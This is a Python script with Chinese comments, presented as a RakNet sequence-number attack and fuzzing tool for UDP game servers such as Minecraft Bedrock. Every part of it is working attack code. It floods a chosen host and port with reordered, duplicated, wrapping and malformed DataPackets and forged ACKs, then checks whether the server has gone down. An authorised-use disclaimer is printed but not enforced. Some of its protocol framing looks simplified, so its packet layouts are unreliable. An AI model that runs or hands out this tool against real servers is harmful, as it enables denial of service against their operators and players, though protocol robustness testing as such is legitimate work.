#!/usr/bin/env python3
"""
RakNet Sequence Number Attack / Fuzzing Test Script

用途:
  对 RakNet 协议(常见于 Minecraft Bedrock / UDP 游戏服务端)进行 sequence number
  鲁棒性测试,验证服务端对异常 sequence number 的处理能力。

测试场景:
  1. 乱序 (out-of-order) sequence number
  2. 重复 (duplicate) sequence number
  3. 跳跃/巨大 gap (sequence number jump)
  4. 回绕 (wrap-around) 测试
  5. ACK/NAK 灌注 (ack flood)
  6. 负值 / 非法 sequence number

注意:
  - 仅用于授权的渗透测试与协议研究。
  - RakNet sequence number 为 24-bit (0 ~ 0xFFFFFF),使用 little-endian。
"""

import argparse
import random
import socket
import struct
import sys
import time
from dataclasses import dataclass
from typing import List


# ---------------------------------------------------------------------------
# RakNet 常量 (offline / online 消息 ID)
# ---------------------------------------------------------------------------
ID_UNCONNECTED_PING = 0x01
ID_UNCONNECTED_PONG = 0x1C
ID_OPEN_CONNECTION_REQUEST_1 = 0x05
ID_OPEN_CONNECTION_REPLY_1 = 0x06
ID_OPEN_CONNECTION_REQUEST_2 = 0x07
ID_OPEN_CONNECTION_REPLY_2 = 0x08

ID_DATA_PACKET = 0x80       # 0x80 ~ 0x8d: DataPacket (带 sequence number)
ID_ACK = 0xC0               # 0xc0 ~ 0xc3: ACK
ID_NAK = 0xc4               # 0xc4 ~ 0xc7: NAK

MAGIC = b"\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78"

# RakNet sequence number 是 24-bit
SEQ_MAX = 0xFFFFFF
SEQ_MOD = 0x1000000


# ---------------------------------------------------------------------------
# 工具函数
# ---------------------------------------------------------------------------
def pack_seq24(seq: int) -> bytes:
    """将 24-bit sequence number 打包为 little-endian 3 字节。"""
    seq &= SEQ_MAX
    return bytes([seq & 0xFF, (seq >> 8) & 0xFF, (seq >> 16) & 0xFF])


def unpack_seq24(data: bytes) -> int:
    return data[0] | (data[1] << 8) | (data[2] << 16)


def build_data_packet(seq: int, payload: bytes = b"\x00") -> bytes:
    """
    构造一个 DataPacket (ID_DATA_PACKET | flags) + 24-bit sequence number + payload。
    flags 低 3 位表示 record 数量,这里用 0 即 1 个 record。
    """
    return bytes([ID_DATA_PACKET]) + pack_seq24(seq) + payload


def build_ack(seq_list: List[int]) -> bytes:
    """
    构造一个 ACK 包,简单地为每个 sequence number 写一条单独的 record
    (record type 0x00 = single, 3 字节 seq)。
    """
    count = len(seq_list)
    # ID_ACK 高 2 位 = 0b11 表示 count (限制在 0~3 之间演示用)
    if count > 3:
        count = 3
        seq_list = seq_list[:3]
    flags = 0xC0 | (count & 0x03)
    body = bytearray([flags])
    for s in seq_list:
        body.append(0x00)          # record: single
        body += pack_seq24(s)
    return bytes(body)


# ---------------------------------------------------------------------------
# RakNet 客户端
# ---------------------------------------------------------------------------
@dataclass
class AttackConfig:
    target: str
    port: int
    timeout: float = 2.0
    delay: float = 0.01
    count: int = 100


class RakNetAttacker:
    def __init__(self, cfg: AttackConfig):
        self.cfg = cfg
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.settimeout(cfg.timeout)
        self.addr = (cfg.target, cfg.port)
        self.local_seq = 0

    # ---- 基础 IO ----
    def send_raw(self, data: bytes) -> None:
        self.sock.sendto(data, self.addr)

    def recv_raw(self) -> bytes:
        try:
            data, _ = self.sock.recvfrom(2048)
            return data
        except socket.timeout:
            return b""

    def next_local_seq(self) -> int:
        s = self.local_seq
        self.local_seq = (self.local_seq + 1) % SEQ_MOD
        return s

    # ---- 握手辅助 ----
    def unconnected_ping(self) -> bytes:
        """发送 Unconnected Ping,用于探测服务端是否在线。"""
        ts = struct.pack(">Q", int(time.time() * 1000))
        pkt = bytes([ID_UNCONNECTED_PING]) + ts + MAGIC + b"\x00" * 8
        self.send_raw(pkt)
        return self.recv_raw()

    def is_online(self) -> bool:
        resp = self.unconnected_ping()
        return bool(resp) and resp[0] == ID_UNCONNECTED_PONG

    # ---- 攻击场景 ----
    def attack_out_of_order(self) -> None:
        """乱序:发送一系列 sequence number 顺序被打乱的 DataPacket。"""
        print("[*] 场景1: 乱序 sequence number")
        seqs = list(range(self.cfg.count))
        random.shuffle(seqs)
        for s in seqs:
            self.send_raw(build_data_packet(s, b"\x00"))
            time.sleep(self.cfg.delay)
        print(f"    已发送 {self.cfg.count} 个乱序包")

    def attack_duplicate(self) -> None:
        """重复:对同一个 sequence number 反复发送,测试服务端去重能力。"""
        print("[*] 场景2: 重复 sequence number")
        seq = random.randint(0, SEQ_MAX)
        for _ in range(self.cfg.count):
            self.send_raw(build_data_packet(seq, b"\x00"))
            time.sleep(self.cfg.delay)
        print(f"    已对 seq={seq} 发送 {self.cfg.count} 次")

    def attack_huge_gap(self) -> None:
        """巨大 gap:sequence number 直接跳到接近上限,测试溢出处理。"""
        print("[*] 场景3: 巨大 sequence number gap")
        for i in range(self.cfg.count):
            # 在 0xFFFFF0 ~ 0xFFFFFF 附近循环,触发边界
            s = (0xFFFFF0 + i) & SEQ_MAX
            self.send_raw(build_data_packet(s, b"\x00"))
            time.sleep(self.cfg.delay)
        print(f"    已发送 {self.cfg.count} 个高段 sequence 包")

    def attack_wraparound(self) -> None:
        """回绕:从 0xFFFFFE 开始发送,使其回绕到 0。"""
        print("[*] 场景4: sequence number 回绕")
        start = 0xFFFFFE
        for i in range(self.cfg.count):
            s = (start + i) % SEQ_MOD
            self.send_raw(build_data_packet(s, b"\x00"))
            time.sleep(self.cfg.delay)
        print(f"    已发送 {self.cfg.count} 个回绕 sequence 包")

    def attack_ack_flood(self) -> None:
        """ACK 灌注:大量发送 ACK,声称已收到尚未发送的 sequence。"""
        print("[*] 场景5: ACK 灌注")
        for _ in range(self.cfg.count):
            seqs = [random.randint(0, SEQ_MAX) for _ in range(3)]
            self.send_raw(build_ack(seqs))
            time.sleep(self.cfg.delay)
        print(f"    已发送 {self.cfg.count} 个伪造 ACK 包")

    def attack_invalid_seq(self) -> None:
        """非法值:虽然在 24-bit 范围内,但快速跳跃制造异常。
        另外发送长度异常的 DataPacket 探测解析鲁棒性。"""
        print("[*] 场景6: 非法 / 异常 DataPacket")
        for _ in range(self.cfg.count):
            s = random.randint(0, SEQ_MAX)
            # 故意截断 payload,或附加超长数据
            payload = b"\x00" * random.choice([0, 1, 512, 1024])
            self.send_raw(build_data_packet(s, payload))
            time.sleep(self.cfg.delay)
        print(f"    已发送 {self.cfg.count} 个异常 DataPacket")

    # ---- 综合 ----
    def run_all(self, scenarios: List[str]) -> None:
        if not self.is_online():
            print(f"[!] 目标 {self.cfg.target}:{self.cfg.port} 未响应 Unconnected Ping")
            print("    继续尝试发送(部分服务端可能禁用 ping)...")
        else:
            print(f"[+] 目标在线: {self.cfg.target}:{self.cfg.port}")

        dispatch = {
            "reorder":    self.attack_out_of_order,
            "duplicate":  self.attack_duplicate,
            "gap":        self.attack_huge_gap,
            "wrap":       self.attack_wraparound,
            "ack":        self.attack_ack_flood,
            "invalid":    self.attack_invalid_seq,
        }

        for s in scenarios:
            fn = dispatch.get(s)
            if fn is None:
                print(f"[!] 未知场景: {s}, 跳过")
                continue
            try:
                fn()
            except Exception as e:
                print(f"    [-] 场景 {s} 异常: {e}")

        # 收尾:观察服务端是否仍在响应
        time.sleep(0.5)
        alive = self.is_online()
        print(f"\n[*] 测试完成,服务端当前 {'在线' if alive else '无响应 / 离线'}")

    def close(self) -> None:
        self.sock.close()


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
SCENARIO_HELP = {
    "reorder":   "乱序 sequence number",
    "duplicate": "重复 sequence number",
    "gap":       "巨大 sequence number gap",
    "wrap":      "sequence number 回绕",
    "ack":       "ACK 灌注",
    "invalid":   "异常 / 非法 DataPacket",
}


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="RakNet sequence number 攻击 / 鲁棒性测试脚本",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="可用场景:\n" + "\n".join(f"  {k:10s} {v}" for k, v in SCENARIO_HELP.items()),
    )
    p.add_argument("target", help="目标 IP / 主机名")
    p.add_argument("port", type=int, help="目标 UDP 端口")
    p.add_argument("-s", "--scenarios", nargs="+",
                   default=["reorder", "duplicate", "gap", "wrap", "ack", "invalid"],
                   choices=list(SCENARIO_HELP.keys()),
                   help="要执行的攻击场景 (默认全部)")
    p.add_argument("-n", "--count", type=int, default=100,
                   help="每个场景发送的包数量 (默认 100)")
    p.add_argument("-d", "--delay", type=float, default=0.01,
                   help="每个包间隔秒数 (默认 0.01)")
    p.add_argument("-t", "--timeout", type=float, default=2.0,
                   help="socket 接收超时秒数 (默认 2.0)")
    return p.parse_args()


def main() -> int:
    args = parse_args()

    print("=" * 60)
    print(" RakNet Sequence Number Attack / Fuzzing Tool")
    print("=" * 60)
    print(f" 目标       : {args.target}:{args.port}")
    print(f" 场景       : {', '.join(args.scenarios)}")
    print(f" 包数量/场景: {args.count}")
    print(f" 发包间隔   : {args.delay}s")
    print("=" * 60)
    print(" ⚠ 仅用于授权的安全测试与协议研究,禁止用于非法用途。\n")

    cfg = AttackConfig(
        target=args.target,
        port=args.port,
        timeout=args.timeout,
        delay=args.delay,
        count=args.count,
    )

    attacker = RakNetAttacker(cfg)
    try:
        attacker.run_all(args.scenarios)
    except KeyboardInterrupt:
        print("\n[!] 用户中断")
    finally:
        attacker.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
